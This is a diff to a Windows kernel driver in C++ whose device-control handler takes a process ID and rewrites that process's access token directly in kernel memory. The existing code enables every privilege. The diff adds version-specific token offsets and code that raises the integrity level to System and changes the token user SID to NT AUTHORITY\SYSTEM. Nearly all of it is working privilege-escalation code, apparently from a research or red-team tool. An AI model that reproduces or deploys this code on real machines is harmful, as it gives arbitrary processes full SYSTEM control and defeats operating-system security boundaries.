@@ -6,9 +6,16 @@
 
 // _SEP_TOKEN_PRIVILEGES was introduced since Windows Vista.
 // The offset from _TOKEN have been fixed for now (Win 11 23H2).
-// See https://www.vergiliusproject.com/kernels/x64/Windows%20Vista%20%7C%202008/RTM/_TOKEN
+// See - https://www.vergiliusproject.com/kernels/x64/Windows%20Vista%20%7C%202008/RTM/_TOKEN
 #define VALID_PRIVILEGE_MASK 0x0000001FFFFFFFFCULL
 #define SEP_TOKEN_OFFSET 0x40
+
+//
+// Global Variables
+//
+ULONG g_UserAndGroupCountOffset = 0u;
+ULONG g_UserAndGroupsOffset = 0u;
+ULONG g_IntegrityLevelIndexOffset = 0u;
 
 //
 // Struct definition
@@ -54,10 +61,43 @@ NTSTATUS DriverEntry(
 
 	do
 	{
+		RTL_OSVERSIONINFOW versionInfo{ 0 };
 		UNICODE_STRING devicePath{ 0 };
 		UNICODE_STRING symlinkPath{ 0 };
 		::RtlInitUnicodeString(&devicePath, DEVICE_PATH);
 		::RtlInitUnicodeString(&symlinkPath, SYMLINK_PATH);
+
+		ntstatus = ::RtlGetVersion(&versionInfo);
+
+		if (!NT_SUCCESS(ntstatus))
+		{
+			KdPrint((DRIVER_PREFIX "Failed to get OS version information (NTSTATUS = 0x%08X).\n", ntstatus));
+			break;
+		}
+		else
+		{
+			if (versionInfo.dwMajorVersion < 6)
+			{
+				// Older than Windows Vista does not have _SEP_TOKEN_PRIVILEGE
+				ntstatus = STATUS_NOT_SUPPORTED;
+				KdPrint((DRIVER_PREFIX "Failed to get OS version information (NTSTATUS = 0x%08X).\n", ntstatus));
+				break;
+			}
+			else if ((versionInfo.dwMajorVersion == 6) && (versionInfo.dwMinorVersion < 2))
+			{
+				// Older than Windows 8 or Server 2012
+				g_UserAndGroupCountOffset = 0x78;
+				g_UserAndGroupsOffset = 0x90;
+				g_IntegrityLevelIndexOffset = 0xC8;
+			}
+			else
+			{
+				// Windows 8, Server 2012, and newer than them
+				g_UserAndGroupCountOffset = 0x7C;
+				g_UserAndGroupsOffset = 0x98;
+				g_IntegrityLevelIndexOffset = 0xD0;
+			}
+		}
 
 		ntstatus = ::IoCreateDevice(
 			DriverObject,
@@ -160,6 +200,9 @@ NTSTATUS OnDeviceControl(
 		{
 			PACCESS_TOKEN pPrimaryToken = ::PsReferencePrimaryToken(pEprocess);
 			auto pSepToken = (PSEP_TOKEN_PRIVILEGES)((ULONG_PTR)pPrimaryToken + SEP_TOKEN_OFFSET);
+			auto nUserAndGroupCount = *(ULONG*)((ULONG_PTR)pPrimaryToken + g_UserAndGroupCountOffset);
+			auto pUserAndGroups = *(PSID_AND_ATTRIBUTES*)((ULONG_PTR)pPrimaryToken + g_UserAndGroupsOffset);
+			auto nIntegrityLevelIndex = *(ULONG*)((ULONG_PTR)pPrimaryToken + g_IntegrityLevelIndexOffset);
 
 			KdPrint((DRIVER_PREFIX "Primary token for PID %u is at %p.\n", ::HandleToULong(pid), pPrimaryToken));
 			KdPrint((DRIVER_PREFIX "_SEP_TOKEN_PRIVILEGES for PID %u is at %p.\n", ::HandleToULong(pid), pSepToken));
@@ -168,10 +211,40 @@ NTSTATUS OnDeviceControl(
 			pSepToken->Enabled = VALID_PRIVILEGE_MASK;
 			pSepToken->EnabledByDefault = VALID_PRIVILEGE_MASK;
 
+			KdPrint((DRIVER_PREFIX "_SEP_TOKEN_PRIVILEGES for PID %u is overwritten successfully.\n", HandleToULong(pid)));
+
+			// Overwrite Integrity Level to System level
+			auto pSid = (PISID)pUserAndGroups[nIntegrityLevelIndex].Sid;
+			pSid->SubAuthority[0] = 0x4000;
+
+			KdPrint((DRIVER_PREFIX "Integrity level of PID %u is modified to System level.\n", HandleToULong(pid)));
+
+			for (auto idx = 0u; idx < nUserAndGroupCount; idx++)
+			{
+				// Overwrite token user to "NT AUTHORITY\SYSTEM"
+				if (pUserAndGroups[idx].Attributes == 0)
+				{
+					pSid = (PISID)pUserAndGroups[idx].Sid;
+
+					for (auto offset = 1; offset < pSid->SubAuthorityCount; offset++)
+						pSid->SubAuthority[offset] = 0;
+
+					pSid->SubAuthorityCount = 1;
+					pSid->IdentifierAuthority.Value[0] = 0;
+					pSid->IdentifierAuthority.Value[1] = 0;
+					pSid->IdentifierAuthority.Value[2] = 0;
+					pSid->IdentifierAuthority.Value[3] = 0;
+					pSid->IdentifierAuthority.Value[4] = 0;
+					pSid->IdentifierAuthority.Value[5] = 5;
+					pSid->SubAuthority[0] = 18;
+
+					KdPrint((DRIVER_PREFIX "Token user of PID %u is modified to \"NT AUTHORITY\\SYSTEM\".\n", HandleToULong(pid)));
+					break;
+				}
+			}
+
 			::PsDereferencePrimaryToken(pPrimaryToken);
 			ObDereferenceObject(pEprocess);
-
-			KdPrint((DRIVER_PREFIX "_SEP_TOKEN_PRIVILEGES for PID %u is overwritten successfully.\n", HandleToULong(pid)));
 		}
 	}
 
